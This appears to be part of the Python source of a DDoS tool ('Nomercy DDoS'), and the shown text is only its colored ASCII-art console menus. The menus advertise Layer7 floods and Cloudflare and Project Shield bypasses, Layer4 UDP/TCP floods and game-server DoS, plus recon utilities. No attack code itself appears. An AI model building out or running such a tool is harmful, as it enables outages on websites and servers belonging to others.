    stdout.write("    "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"THANK " +Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+"                    "+Fore.LIGHTBLUE_EX+"             ║\n")
    stdout.write("    "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"YOU♥  " +Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+"                    "+Fore.LIGHTBLUE_EX+"             ║\n")
    stdout.write("    "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"      " +Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+"                    "+Fore.LIGHTBLUE_EX+"             ║\n")
    stdout.write("    "+Fore.LIGHTBLUE_EX  +"╚═══════════════════════════════════════════╝\n")
    stdout.write("\n")

##############################################################################################
def infoattack():
    stdout.write("             "+Fore.LIGHTBLUE_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTBLUE_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.LIGHTBLUE_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"layer7/l7   "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+" Show Layer7 Methods                 "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write("             "+Fore.LIGHTBLUE_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"layer4/l4   "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+" Show Layer4 Methods                 "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write("             "+Fore.LIGHTBLUE_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tools       "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+" Show tools                          "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write("             "+Fore.LIGHTBLUE_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"credit      "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+"                                     "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write("             "+Fore.LIGHTBLUE_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"exit        "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+"                                     "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write("             "+Fore.LIGHTBLUE_EX            +"╠═════════════════════════════════════════════════════╣\n")
    stdout.write("             "+Fore.LIGHTBLUE_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"THANK    "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+"                                        "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write("             "+Fore.LIGHTBLUE_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"YOU♥     "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+"                                        "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write("             "+Fore.LIGHTBLUE_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"         "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+"                                        "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write("             "+Fore.LIGHTBLUE_EX            +"╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")

##############################################################################################
def credit():
    stdout.write("\x1b[38;2;0;236;250m════════════════════════╗\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Modified"+Fore.RED+": \x1b[38;2;0;255;189m ZuT      \n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Edited"+Fore.RED+"  : \x1b[38;2;0;255;189m ZuT      \n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Changed"+Fore.RED+" : \x1b[38;2;0;255;189m ZuT      \n")
    stdout.write("\x1b[38;2;0;236;250m════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def layer7_1():
    clear()
    stdout.write(" "+Fore.LIGHTBLUE_EX  +   " PAGE 1                                          \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +" ███╗   ██╗ ██████╗ ███╗   ███╗███████╗██████╗  ██████ ██╗   ██╗     ██████╗ ██████╗  ██████╗ ███████╗ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +" ████╗  ██║██╔═══██╗████╗ ████║██╔════╝██╔══██╗██╔════ ╚██╗ ██╔╝     ██╔══██╗██╔══██╗██╔═══██╗██╔════╝ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ██╔██╗ ██║██║   ██║██╔████╔██║█████╗  ██████╔╝██║      ╚████╔╝      ██║  ██║██║  ██║██║   ██║███████╗ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ██║╚██╗██║██║   ██║██║╚██╔╝██║██╔══╝  ██╔══██╗██║       ╚██╔╝       ██║  ██║██║  ██║██║   ██║╚════██║ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ██║ ╚████║╚██████╔╝██║ ╚═╝ ██║███████╗██║  ██║╚██████    ██║        ██████╔╝██████╔╝╚██████╔╝███████║ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝        ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ \n")
    stdout.write("                                                                                  \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX  +"    ██╗      █████╗ ██╗   ██╗███████╗██████╗ ███████╗ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"    ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗╚════██║ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"    ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ██╔╝ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"    ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗   ██╔╝  \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"    ███████╗██║  ██║   ██║   ███████╗██║  ██║   ██║   \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝   \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"        ════╦════════════════════════════════════╦══\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"╔═══════════╩════════════════════════════════════╩═════════╗\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"COMMAND"+Fore.LIGHTBLUE_EX+"    "+Fore.LIGHTWHITE_EX+"                     LIST                 "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║══════════════════════════════════════════════════════════║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfb    "+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" Bypass CF Attack                         "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxcfb  "+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" Bypass CF Attack With Proxy              "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfpro  "+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (request)    "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfsoc  "+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (socket)     "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"bypass "+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" Bypass Google Project Shield, Vshield,   "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"attack "+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" DDoS Guard Free, CF NoSec                "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"stellar"+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" HTTPS Sky Attack method without proxies  "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"strike "+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" strike attack                            "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"get    "+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" Get Request Attack                       "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"post   "+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" Post Request Attack                      "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"head   "+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" Head Request Attack                      "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"http2  "+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" HTTP 2.0 Request Attack                  "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"spoof  "+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" HTTP Spoof Socket Attack                 "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"soc    "+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" Socket Attack                            "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"hulk   "+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" Hulk DoS tool                            "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxhulk "+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" Proxy Hulk DoS tool                      "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxraw  "+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" Proxy Request Attack                     "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxsoc  "+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" Proxy Socket Attack                      "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxslow "+Fore.LIGHTBLUE_EX+"   ║"+Fore.LIGHTWHITE_EX+" Proxy Slowloris attack                   "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"╚══════════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################

def layer7_2():
    clear()
    stdout.write(" "+Fore.LIGHTBLUE_EX  +   " PAGE 2                                          \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +" ███╗   ██╗ ██████╗ ███╗   ███╗███████╗██████╗  ██████ ██╗   ██╗     ██████╗ ██████╗  ██████╗ ███████╗ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +" ████╗  ██║██╔═══██╗████╗ ████║██╔════╝██╔══██╗██╔════ ╚██╗ ██╔╝     ██╔══██╗██╔══██╗██╔═══██╗██╔════╝ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ██╔██╗ ██║██║   ██║██╔████╔██║█████╗  ██████╔╝██║      ╚████╔╝      ██║  ██║██║  ██║██║   ██║███████╗ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ██║╚██╗██║██║   ██║██║╚██╔╝██║██╔══╝  ██╔══██╗██║       ╚██╔╝       ██║  ██║██║  ██║██║   ██║╚════██║ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ██║ ╚████║╚██████╔╝██║ ╚═╝ ██║███████╗██║  ██║╚██████    ██║        ██████╔╝██████╔╝╚██████╔╝███████║ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝        ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ \n")
    stdout.write("                                                                                  \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX  +"    ██╗      █████╗ ██╗   ██╗███████╗██████╗ ███████╗ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"    ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗╚════██║ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"    ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ██╔╝ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"    ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗   ██╔╝  \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"    ███████╗██║  ██║   ██║   ███████╗██║  ██║   ██║   \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝   \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"        ════╦════════════════════════════════════╦══\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"╔═══════════╩════════════════════════════════════╩═════════╗\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"       COMMAND"+Fore.LIGHTBLUE_EX+""+Fore.LIGHTWHITE_EX+"LIST                                   "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║══════════════════════════════════════════════════════════║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"tlz        "+Fore.LIGHTBLUE_EX+"  ║"+Fore.LIGHTWHITE_EX+"Presione Ctrl+c para detener el ataque. "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"https2     "+Fore.LIGHTBLUE_EX+"  ║"+Fore.LIGHTWHITE_EX+"Presione Ctrl+c para detener el ataque. "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"hulk2      "+Fore.LIGHTBLUE_EX+"  ║"+Fore.LIGHTWHITE_EX+"Presione Ctrl+c para detener el ataque. "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"http-flood "+Fore.LIGHTBLUE_EX+"  ║"+Fore.LIGHTWHITE_EX+"Presione Ctrl+c para detener el ataque. "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"http-rand  "+Fore.LIGHTBLUE_EX+"  ║"+Fore.LIGHTWHITE_EX+"Presione Ctrl+c para detener el ataque. "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTBLUE_EX+"     ║"+Fore.LIGHTWHITE_EX+"Presione Ctrl+c para detener el ataque. "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTBLUE_EX+"     ║"+Fore.LIGHTWHITE_EX+"Presione Ctrl+c para detener el ataque. "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTBLUE_EX+"     ║"+Fore.LIGHTWHITE_EX+"Presione Ctrl+c para detener el ataque. "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTBLUE_EX+"     ║"+Fore.LIGHTWHITE_EX+"Presione Ctrl+c para detener el ataque. "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTBLUE_EX+"     ║"+Fore.LIGHTWHITE_EX+"Presione Ctrl+c para detener el ataque. "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTBLUE_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTBLUE_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTBLUE_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTBLUE_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTBLUE_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTBLUE_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTBLUE_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTBLUE_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTBLUE_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"        "+Fore.LIGHTBLUE_EX+"     ║"+Fore.LIGHTWHITE_EX+"                                       "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"╚══════════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################

def layer4():
    clear()
    stdout.write("                                                                                  \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +" ███╗   ██╗ ██████╗ ███╗   ███╗███████╗██████╗  ██████ ██╗   ██╗     ██████╗ ██████╗  ██████╗ ███████╗ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +" ████╗  ██║██╔═══██╗████╗ ████║██╔════╝██╔══██╗██╔════ ╚██╗ ██╔╝     ██╔══██╗██╔══██╗██╔═══██╗██╔════╝ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ██╔██╗ ██║██║   ██║██╔████╔██║█████╗  ██████╔╝██║      ╚████╔╝      ██║  ██║██║  ██║██║   ██║███████╗ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ██║╚██╗██║██║   ██║██║╚██╔╝██║██╔══╝  ██╔══██╗██║       ╚██╔╝       ██║  ██║██║  ██║██║   ██║╚════██║ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ██║ ╚████║╚██████╔╝██║ ╚═╝ ██║███████╗██║  ██║╚██████    ██║        ██████╔╝██████╔╝╚██████╔╝███████║ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝        ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ \n")
    stdout.write("                                                                                  \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX  +"   ██╗      █████╗ ██╗   ██╗███████╗██████╗ ██╗  ██╗ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"   ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗██║  ██║ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"   ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝███████║ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"   ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗╚════██║ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"   ███████╗██║  ██║   ██║   ███████╗██║  ██║     ██║ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"   ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝     ╚═╝ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"        ══╦══════════════════════════════╦══\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"╔═════════╩══════════════════════════════╩═════════╗\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"udp   "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+" UDP Attack                             "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tcp   "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+" UDP Attack                             "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"mine  "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+" Minecraft Dos attack                   "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"vse   "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+" Send Valve Source Engine Protocol      "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +"╚══════════════════════════════════════════════════╝\n")
    stdout.write("\n")


##############################################################################################
def tools():
    clear()
    stdout.write("                                                                                 \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +" ███╗   ██╗ ██████╗ ███╗   ███╗███████╗██████╗  ██████ ██╗   ██╗     ██████╗ ██████╗  ██████╗ ███████╗ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX  +" ████╗  ██║██╔═══██╗████╗ ████║██╔════╝██╔══██╗██╔════ ╚██╗ ██╔╝     ██╔══██╗██╔══██╗██╔═══██╗██╔════╝ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ██╔██╗ ██║██║   ██║██╔████╔██║█████╗  ██████╔╝██║      ╚████╔╝      ██║  ██║██║  ██║██║   ██║███████╗ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ██║╚██╗██║██║   ██║██║╚██╔╝██║██╔══╝  ██╔══██╗██║       ╚██╔╝       ██║  ██║██║  ██║██║   ██║╚════██║ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ██║ ╚████║╚██████╔╝██║ ╚═╝ ██║███████╗██║  ██║╚██████    ██║        ██████╔╝██████╔╝╚██████╔╝███████║ \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +" ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝        ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ \n")
    stdout.write("                                                                      \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +"          ████████╗ ██████╗  ██████╗ ██╗  \n")
    stdout.write(" "+Fore.LIGHTWHITE_EX +"          ╚══██╔══╝██╔═══██╗██╔═══██╗██║  \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"             ██║   ██║   ██║██║   ██║██║  \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"             ██║   ██║   ██║██║   ██║██║  \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"             ██║   ╚██████╔╝╚██████╔╝███████╗ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"             ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"          ══╦═══════════════════════════╦══   \n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"  ╔═════════╩═══════════════════════════╩═════════╗\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"  ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"CHECK     "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+" Check if its online"+Fore.LIGHTBLUE_EX+"                 ║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"  ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"INFO      "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+" Whois online check"+Fore.LIGHTBLUE_EX+"                  ║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"  ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"PING      "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+" Ping check"+Fore.LIGHTBLUE_EX+"                          ║\n")
    stdout.write(" "+Fore.LIGHTBLUE_EX +"  ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"DSTAT     "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX+" DSTAT Lookup"+Fore.LIGHTBLUE_EX+"                        ║\n")
